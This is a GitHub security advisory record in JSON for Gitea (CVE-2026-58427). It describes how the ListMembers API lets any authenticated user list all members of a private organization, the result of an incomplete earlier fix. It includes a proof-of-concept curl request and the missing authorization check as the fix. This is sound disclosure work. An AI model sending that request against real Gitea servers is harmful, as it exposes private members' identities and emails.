{"author": null, "closed_at": null, "collaborating_teams": null, "collaborating_users": null, "created_at": null, "credits": [{"login": "Razzlemouse", "type": "reporter"}], "credits_detailed": [{"state": "accepted", "type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/84002020?v=4", "events_url": "https://api.github.com/users/Razzlemouse/events{/privacy}", "followers_url": "https://api.github.com/users/Razzlemouse/followers", "following_url": "https://api.github.com/users/Razzlemouse/following{/other_user}", "gists_url": "https://api.github.com/users/Razzlemouse/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Razzlemouse", "id": 84002020, "login": "Razzlemouse", "node_id": "MDQ6VXNlcjg0MDAyMDIw", "organizations_url": "https://api.github.com/users/Razzlemouse/orgs", "received_events_url": "https://api.github.com/users/Razzlemouse/received_events", "repos_url": "https://api.github.com/users/Razzlemouse/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Razzlemouse/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Razzlemouse/subscriptions", "type": "User", "url": "https://api.github.com/users/Razzlemouse", "user_view_type": "public"}}], "cve_id": "CVE-2026-58427", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": null, "vector_string": null}, "cvss_v4": {"score": null, "vector_string": null}}, "cwe_ids": ["CWE-200"], "cwes": [{"cwe_id": "CWE-200", "name": "Exposure of Sensitive Information to an Unauthorized Actor"}], "description": "## Summary
PR #38145 fixed ListPublicMembers and IsPublicMember but missed 
ListMembers. Any authenticated user can enumerate ALL members 
(not just public ones) of a private organization.

## Affected Versions
<= v1.26.4 (latest) and main branch

## Root Cause
routers/api/v1/org/member.go — ListMembers():

// Missing check:
if !organization.HasOrgOrUserVisible(ctx, 
    ctx.Org.Organization.AsUser(), ctx.Doer) {
    ctx.APIErrorNotFound()
    return
}

## Proof of Concept

# Setup: privateorg (private), alice = member, bob = outsider

# Bob lists ALL members of private org
curl -s "http://gitea/api/v1/orgs/privateorg/members" \
  -H "Authorization: token BOB_TOKEN"

# Result: HTTP 200
[{"login":"alice","email":"alice@test.com",...}]
# Expected: HTTP 404

## Note
This is an incomplete fix variant of PR #38145.
That PR fixed public_members endpoints only.
ListMembers (/orgs/{org}/members) remains unpatched.

## Fix
Add to ListMembers():
if !organization.HasOrgOrUserVisible(ctx, 
    ctx.Org.Organization.AsUser(), ctx.Doer) {
    ctx.APIErrorNotFound()
    return
}
", "ghsa_id": "GHSA-prr9-9mp4-5gp2", "html_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-prr9-9mp4-5gp2", "identifiers": [{"type": "GHSA", "value": "GHSA-prr9-9mp4-5gp2"}, {"type": "CVE", "value": "CVE-2026-58427"}], "private_fork": null, "published_at": "2026-07-13T17:30:04Z", "publisher": {"avatar_url": "https://avatars.githubusercontent.com/u/75789103?v=4", "events_url": "https://api.github.com/users/bircni/events{/privacy}", "followers_url": "https://api.github.com/users/bircni/followers", "following_url": "https://api.github.com/users/bircni/following{/other_user}", "gists_url": "https://api.github.com/users/bircni/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/bircni", "id": 75789103, "login": "bircni", "node_id": "MDQ6VXNlcjc1Nzg5MTAz", "organizations_url": "https://api.github.com/users/bircni/orgs", "received_events_url": "https://api.github.com/users/bircni/received_events", "repos_url": "https://api.github.com/users/bircni/repos", "site_admin": false, "starred_url": "https://api.github.com/users/bircni/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bircni/subscriptions", "type": "User", "url": "https://api.github.com/users/bircni", "user_view_type": "public"}, "severity": "medium", "state": "published", "submission": null, "summary": "Private org member list leaked via /members API endpoint — incomplete fix for PR #38145", "updated_at": "2026-07-14T02:20:42Z", "url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-prr9-9mp4-5gp2", "vulnerabilities": [{"package": {"ecosystem": "go", "name": "gitea.dev"}, "patched_versions": "1.27.0", "vulnerable_functions": [], "vulnerable_version_range": "<= 1.26.4"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: Private org member list leaked via /members API endpoint — incomplete fix for PR #38145
